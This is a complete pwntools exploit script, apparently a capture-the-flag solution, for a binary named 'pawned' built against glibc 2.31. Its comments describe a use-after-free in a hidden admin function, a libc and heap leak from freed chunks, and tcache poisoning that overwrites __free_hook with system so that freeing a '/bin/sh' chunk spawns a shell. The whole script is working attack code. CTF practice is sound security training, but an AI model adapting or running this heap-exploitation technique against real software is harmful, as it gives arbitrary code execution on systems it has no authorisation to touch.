#!/usr/bin/env python3

from pwn import *

#The bug is super simple.. Use afte Free bug in hidden admin function..
#The obstacle is the extra chunk that gets allocated and takes the fd value in float and limited to only 10 allocations
#The float value prevents us to write a valid address to perform tcache poisoning..
#So the trick is to make the large allocation and two different tcache size chunks 
#And then free the large chunk to get unsortedbin metadata to get the libc base
#And then use the uaf bug carefully to not disturb the 0x20 sized chunks and craft the tcache poisoning 

e = ELF("./pawned")
libc = ELF("./libc-2.31.so")
#r = remote("challenge.ctf.games",32712)
r = process("./pawned")
index = 1
def malloc(price,size,data):
    global index
    r.sendafter(b">",b"s\n")
    r.sendafter(b":",f"{price}\n")
    r.sendafter(b":",f"{size}\n")
    r.sendafter(b":",data + b"\n")
    index+=1
    return index - 1

def free(index):
    r.sendafter(b">",b"b\n")
    r.sendafter(b":",f"{index}\n")

def admin(index,price,size,data):
    r.sendafter(b">",b"m\n")
    r.sendafter(b":",f"{index}\n")
    r.sendafter(b":",f"{price}\n")
    r.sendafter(b":",f"{size}\n")
    r.sendafter(b":",data + b"\n")


malloc(20,1200,b"A" * 135)           #Large chunk whose size is bigger than tcache to get libc leak after free
malloc(20,56,b"B" * 30)              #tcache chunk allocation of 2 sizes to escape from the float in tcache fd 
malloc(20,56,b"C" * 30)
malloc(20,56,b"C2" * 10)
malloc(20,56,b"C3" * 10)
malloc(20,72,b"D" * 30)
malloc(20,72,b"E" * 30)
free(1)                              #Free the large chunk to get unsortbed metadata to get libc base
free(2)                              #Free a couple of tcache chunks to ready up the tcache poisoning
free(4)
r.sendafter(b">",b"p\n")
r.recvuntil(b"1. Price $0.000000, Name:")     
libc_leak = u64(r.recvuntil(b"\x7f").strip(b"\x20").decode('latin-1').ljust(8,'\x00')) #Parsing the libc leak to get libc base
libc_base = libc_leak - (libc.sym["__malloc_hook"] + 112)
r.recvuntil(b"4. Price $0.000000, Name:")                                      
heap_leak = u64(r.recvline().strip().decode('latin-1').ljust(8,'\x00')) #Parsing the heap leak to get heap base
heap_base = heap_leak - 0x7c0
free(6)                                                        #Free up the other couple of tcache chunks 
free(7)
admin(7,20,72,p64(libc_base + libc.sym["__free_hook"]))        #Use the admin functionality to make a use after free condition
admin(3,20,72,b"WIN WIN")                                      #to tamper tcache fd to overwrite free hook to system function
admin(5,20,72,p64(libc_base + libc.sym["system"]))
malloc(20,108,b"/bin/sh\x00")   #Malloc and freeing a different size chunk will call system('/bin/sh') bcoz of tcache poison
free(8)
r.recvuntil(b"buy?:")
r.interactive()
